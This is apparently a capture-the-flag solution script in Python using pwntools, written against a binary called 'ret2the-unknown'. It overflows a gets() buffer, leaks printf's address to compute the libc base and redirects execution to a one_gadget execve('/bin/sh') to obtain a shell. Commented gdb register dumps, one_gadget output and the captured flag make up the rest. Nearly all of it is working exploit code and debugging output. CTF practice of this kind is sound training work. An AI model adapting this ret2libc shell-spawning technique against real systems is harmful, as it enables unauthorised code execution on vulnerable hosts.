from pwn import *
import time
binf = ELF("./ret2the-unknown")
libc = ELF('./libc-2.28.so')

'''
main 0x14b5
lectura del 1 fopen = 0x5555555554e3 = 0xfbad2488
0x555555555521 <main+108>    mov    eax, dword ptr [rbp - 0x14] antes de srand
0X133C IN-WHILE
'''

gs = '''
set exception-verbose on
break *0x00000000004011f9
break *0x401237
break *0x401220
'''
def start():
    if args.GDB:
        return gdb.debug(binf.path, gdbscript=gs)
    else:
        return process(binf.path)
        #return remote("mc.ax",31568)

context.log_level = "DEBUG"
context.aslr = False

print(binf.plt)

shell=""
shell=b"flag.txt" 

g = cyclic_metasploit(80)

# i=68
# while(i<80):
ret=0x000000000040101a;
p=start()
print(p.recvuntil('safely?\n'))
pad=b'A'*40
# rbp=p64(0x7fffffffdf30)
pay=p64(ret)
pay+=p64(binf.symbols['main'])
#pay=p64(0x04011F2)
exp1=pad+pay
print(exp1)
p.sendline(exp1)
bss=p64(0x404040)

# 0x0000000000401231 mov eax, 0

leak = p.recvuntil('luck!\n')
leak=int(b'0x'+leak.split(b'\n')[1].split(b' ')[8][:], base=16)
print('leak')
print(hex(leak))
libc_base =(leak-libc.symbols['printf'])
one=0x4484f
system=one+libc_base
exploit=b'Z'*40
exploit+=p64(ret)
exploit+=p64(system)
print(hex(libc_base),'******')
print(hex(system),'******')
# pause()
p.sendline(exploit)
p.interactive()
p.close()
# print(hex(binf.libc))

# Asi no truena
# *RAX  0x41
# *RBX  0x7fffffffdf30 ◂— 0x0
# *RCX  0xa
# *RDX  0x7fffffff
# *RDI  0x0
# *RSI  0x7fffffffdf31 ◂— 0xa000000000000000
# *R8   0x0
#  R9   0x7ffff7fe4530 ◂— push   rbp
#  R10  0x0
#  R11  0x246
# *R12  0x404050 (stdin@@GLIBC_2.2.5) —▸ 0x7ffff7fb4980 (_IO_2_1_stdin_) ◂— 0xfbad208b
# *R13  0x0
#  R14  0x0
#  R15  0x0
# *RBP  0x7ffff7fb4980 (_IO_2_1_stdin_) ◂— 0xfbad208b
# *RSP  0x7fffffffdf00 —▸ 0x401240 (__libc_csu_init) ◂— endbr64 
# *RIP  0x7ffff7e4fc23 (gets+307) ◂— mov    byte ptr [rbx], al

# si funciona
# *RAX  0x41
# *RBX  0x4242424242424222 ('"BBBBBBB')
# *RCX  0xa
# *RDX  0x7fffffff
# *RDI  0x0
# *RSI  0x4242424242424223 ('#BBBBBBB')
# *R8   0x0
#  R9   0x32
#  R10  0x402139 ◂— 0x6c20646f6f67000a /* '\n' */
#  R11  0x246
# *R12  0x404050 (stdin@@GLIBC_2.2.5) —▸ 0x7ffff7fb4980 (_IO_2_1_stdin_) ◂— 0xfbad208b
# *R13  0x0
#  R14  0x0
#  R15  0x0
# *RBP  0x7ffff7fb4980 (_IO_2_1_stdin_) ◂— 0xfbad208b
# *RSP  0x7fffffffdf30 ◂— 0x4141414141414141 ('AAAAAAAA')
# *RIP  0x7ffff7e4fc23 (gets+307) ◂— mov    byte ptr [rbx], al


# all=p.recvall()
# print(all)
# p.interactive()
# print(p.recvuntil('safely?\n'))
# pad=b'A'*40
# pay=p64(binf.plt['printf'])
# exp=pad+pay
# print(exp)
# p.sendline(exp)



# Non-debugging symbols:
# 0x0000000000401000  _init
# 0x0000000000401060  printf@plt
# 0x0000000000401070  puts@plt
# 0x0000000000401080  setbuf@plt
# 0x0000000000401090  gets@plt
# 0x00000000004010a0  _start
# 0x00000000004010d0  _dl_relocate_static_pie
# 0x00000000004010e0  deregister_tm_clones
# 0x0000000000401110  register_tm_clones
# 0x0000000000401150  __do_global_dtors_aux
# 0x0000000000401180  frame_dummy
# 0x0000000000401186  main
# 0x0000000000401240  __libc_csu_init
# 0x00000000004012b0  __libc_csu_fini
# 0x00000000004012b8  _fini

# web_testing@WebTesting:/media/sf_PwnLin/ret2the_unknown$ one_gadget libc-2.28.so 
# 0x4484f execve("/bin/sh", rsp+0x30, environ)
# constraints:
#   rax == NULL

# 0x448a3 execve("/bin/sh", rsp+0x30, environ)
# constraints:
#   [rsp+0x30] == NULL

# 0xe5456 execve("/bin/sh", rsp+0x60, environ)
# constraints:
#   [rsp+0x60] == NULL

# registros printf en <buffered_vfprintf+184> primera vuelta

# Program received signal SIGSEGV, Segmentation fault.
# buffered_vfprintf (s=s@entry=0x7ffff7fb56a0 <_IO_2_1_stdout_>, format=format@entry=0x402110 "rob said i'd need this to get there: %llx\n", args=args@entry=0x7fffffffde58, mode_flags=mode_flags@entry=0) at vfprintf-internal.c:2377
# 2377	in vfprintf-internal.c
# LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
# ─────────────────────────────────[ REGISTERS ]──────────────────────────────────
#  RAX  0x7ffff7fb58a0 (_IO_helper_jumps) ◂— 0x0
#  RBX  0x7ffff7fb56a0 (_IO_2_1_stdout_) ◂— 0xfbad2887
#  RCX  0x0
#  RDX  0x7fffffffde58 ◂— 0x3000000008
#  RDI  0x7fffffffb798 ◂— 0xfbad8004
#  RSI  0x402110 ◂— "rob said i'd need this to get there: %llx\n"
#  R8   0x25
#  R9   0x0
#  R10  0x402110 ◂— "rob said i'd need this to get there: %llx\n"
#  R11  0x246
#  R12  0x7ffff7fb56a0 (_IO_2_1_stdout_) ◂— 0xfbad2887
#  R13  0x402110 ◂— "rob said i'd need this to get there: %llx\n"
#  R14  0x7fffffffde58 ◂— 0x3000000008
#  R15  0xfbad2887
#  RBP  0x7fffffffde48 —▸ 0x7fffffffdf58 ◂— 0x4141414141414141 ('AAAAAAAA')
#  RSP  0x7fffffffb778 —▸ 0x7ffff7fb56a0 (_IO_2_1_stdout_) ◂— 0xfbad2887
#  RIP  0x7ffff7e46018 (buffered_vfprintf+184) ◂— movaps xmmword ptr [rsp + 0x40], xmm0
# ─────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────
#  ► 0x7ffff7e46018 <buffered_vfprintf+184>    movaps xmmword ptr [rsp + 0x40], xmm0
# pwndbg> x $rsp+0x40
# 0x7fffffffb7b0:	0x00000000

# [DEBUG] Received 0x53 bytes:
#     b'flag{rob-is-proud-of-me-for-exploring-the-unknown-but-i-still-cant-afford-housing}\n'
# flag{rob-is-proud-of-me-for-exploring-the-unknown-but-i-still-cant-afford-housing}
# $
